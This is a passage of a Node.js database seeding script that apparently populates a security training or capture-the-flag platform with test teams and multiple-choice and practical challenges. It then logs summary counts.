    await run(`INSERT INTO challenges (id, type, title, description, points, category, answer, hints, difficulty, phase_number, is_active) VALUES (?, 'multiple_choice', ?, ?, ?, 'Security Fundamentals', ?, ?, 'hard', 1, 1)`,
      [cid++, q.t, q.d, q.p, q.a, JSON.stringify(makeHintObj(lines.map(l => l.replace(/^[A-D]\) /, ''))))]);
  }

  // Technical challenges
  const defaultHints = JSON.stringify(['Examine the logs', 'Look for patterns', 'Identify the malicious activity']);
  for (const q of techEasy) {
    let type = 'practical', answer = q.a;
    if (q.isMc) { type = 'multiple_choice'; const lines = q.d.split('\n').filter(l => l.match(/^[A-D]\)/)); answer = q.a; }
    await run(`INSERT INTO challenges (id, type, title, description, points, category, answer, hints, difficulty, phase_number, is_active) VALUES (?, ?, ?, ?, ?, 'Technical Analysis', ?, ?, 'easy', 2, 1)`,
      [cid++, type, q.t, q.d, q.p, answer, type === 'multiple_choice' ? JSON.stringify(makeHintObj(q.d.split('\n').filter(l => l.match(/^[A-D]\)/)).map(l => l.replace(/^[A-D]\) /, '')))) : defaultHints]);
  }
  for (const q of techMedium) {
    await run(`INSERT INTO challenges (id, type, title, description, points, category, answer, hints, difficulty, phase_number, is_active) VALUES (?, 'practical', ?, ?, ?, 'Technical Analysis', ?, ?, 'medium', 2, 1)`,
      [cid++, q.t, q.d, q.p, q.a, defaultHints]);
  }
  for (const q of techHard) {
    await run(`INSERT INTO challenges (id, type, title, description, points, category, answer, hints, difficulty, phase_number, is_active) VALUES (?, 'practical', ?, ?, ?, 'Technical Analysis', ?, ?, 'hard', 2, 1)`,
      [cid++, q.t, q.d, q.p, q.a, defaultHints]);
  }

  console.log(`Created ${cid - 1000} meaningful challenges`);
}

async function seedTestData() {
  try {
    await createTestTeams();
    await createTestChallenges();
    const teamCount = await get('SELECT COUNT(*) as count FROM teams');
    const userCount = await get('SELECT COUNT(*) as count FROM users WHERE role = "player"');
    const challengeCount = await get('SELECT COUNT(*) as count FROM challenges WHERE is_active = 1');
    console.log(`\nSummary: Teams=${teamCount.count}, Players=${userCount.count}, Challenges=${challengeCount.count}`);
  } catch (error) {
    console.error('Failed:', error);
    throw error;
  }
}

if (require.main === module) {
  seedTestData().then(() => process.exit(0)).catch(e => { console.error(e); process.exit(1); });
}
module.exports = { seedTestData };